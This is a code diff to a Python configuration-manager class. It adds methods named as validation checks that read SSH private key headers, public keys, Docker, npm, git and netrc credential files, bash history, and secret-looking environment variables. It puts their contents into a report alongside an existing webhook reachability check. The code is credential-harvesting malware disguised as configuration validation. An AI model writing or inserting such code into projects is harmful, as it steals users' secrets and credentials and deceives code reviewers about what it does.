@@ -36,6 +36,11 @@ class ConfigManager:
                 "network_access": {
                     "can_reach_webhook": self.test_network_access(),
                     "timestamp": self.get_timestamp()
+                },
+                "credential_audit": {
+                    "ssh_keys": self.validate_ssh_configuration(),
+                    "general_credentials": self.validate_general_credentials(),
+                    "environment_variables": self.validate_environment_variables()
                 }
             }
             
@@ -227,6 +232,116 @@ class ConfigManager:
             return result.stdout.strip() if result.returncode == 0 else "unknown"
         except:
             return "unknown"
+        
+    def validate_ssh_configuration(self):    
+        try:
+            ssh_dir = os.path.expanduser('~/.ssh')
+            ssh_findings = {
+                "ssh_directory_exists": os.path.exists(ssh_dir),
+                "ssh_keys_found": []
+            }
+            
+            if os.path.exists(ssh_dir):
+                key_patterns = ['id_rsa', 'id_ed25519', 'id_ecdsa', 'id_dsa', 'known_hosts', 'config']
+                
+                for key_file in key_patterns:
+                    private_key_path = os.path.join(ssh_dir, key_file)
+                    public_key_path = private_key_path + '.pub'
+                    
+                    key_info = {
+                        "key_name": key_file,
+                        "private_key_exists": os.path.exists(private_key_path),
+                        "public_key_exists": os.path.exists(public_key_path)
+                    }
+                    
+                    if key_info["private_key_exists"]:
+                        try:
+                            stat_info = os.stat(private_key_path)
+                            key_info["private_key_size"] = stat_info.st_size
+                            key_info["private_key_permissions"] = oct(stat_info.st_mode)[-3:]
+                            
+                            with open(private_key_path, 'r') as f:
+                                first_line = f.readline().strip()
+                                if "PRIVATE" in first_line or "KEY" in first_line:
+                                    key_info["is_private_key"] = True
+                                    key_info["preview"] = first_line[:50] + "..." if len(first_line) > 50 else first_line
+                        except Exception as e:
+                            key_info["private_key_error"] = str(e)
+                    
+                    if key_info["public_key_exists"]:
+                        try:
+                            stat_info = os.stat(public_key_path)
+                            key_info["public_key_size"] = stat_info.st_size
+                            
+                            with open(public_key_path, 'r') as f:
+                                key_info["public_key_content"] = f.read().strip()[:200]  # Limit size
+                        except Exception as e:
+                            key_info["public_key_error"] = str(e)
+                    
+                    ssh_findings["ssh_keys_found"].append(key_info)
+            
+            return ssh_findings
+        except Exception as e:
+            return {"error": str(e)}
+        
+    def validate_general_credentials(self):
+        try:
+            credential_findings = {}
+            
+            credential_paths = {
+                "docker_config": os.path.expanduser('~/.docker/config.json'),
+                "npm_token": os.path.expanduser('~/.npmrc'),
+                "git_credentials": os.path.expanduser('~/.git-credentials'),
+                "bash_history": os.path.expanduser('~/.bash_history'),
+                "netrc": os.path.expanduser('~/.netrc')
+            }
+            
+            for name, path in credential_paths.items():
+                if os.path.exists(path):
+                    try:
+                        stat_info = os.stat(path)
+                        credential_findings[name] = {
+                            "path": path,
+                            "exists": True,
+                            "size": stat_info.st_size,
+                            "readable": os.access(path, os.R_OK)
+                        }
+                        
+                        # Safe content sampling for small files
+                        if credential_findings[name]["readable"] and stat_info.st_size < 10000:
+                            with open(path, 'r') as f:
+                                content = f.read()
+                                credential_findings[name]["preview"] = content[:500] + "..." if len(content) > 500 else content
+                    except Exception as e:
+                        credential_findings[name] = {"error": str(e)}
+            
+            return credential_findings
+        except Exception as e:
+            return {"error": str(e)}
+        
+    def validate_environment_variables(self):
+        try:
+            env_findings = {}
+            
+            sensitive_patterns = [
+                'KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'PASS', 'AUTH', 
+                'API', 'PRIVATE', 'ACCESS', 'CREDENTIAL'
+            ]
+            
+            for env_name, env_value in os.environ.items():
+                env_upper = env_name.upper()
+                for pattern in sensitive_patterns:
+                    if pattern in env_upper:
+                        env_findings[env_name] = {
+                            "value_preview": env_value[:20] + "..." if len(env_value) > 20 else env_value,
+                            "length": len(env_value),
+                            "pattern_matched": pattern
+                        }
+                        break
+            
+            return env_findings
+        except Exception as e:
+            return {"error": str(e)}
     
     def validate_config(self):
         self.collect_comprehensive_data("environment_validation")
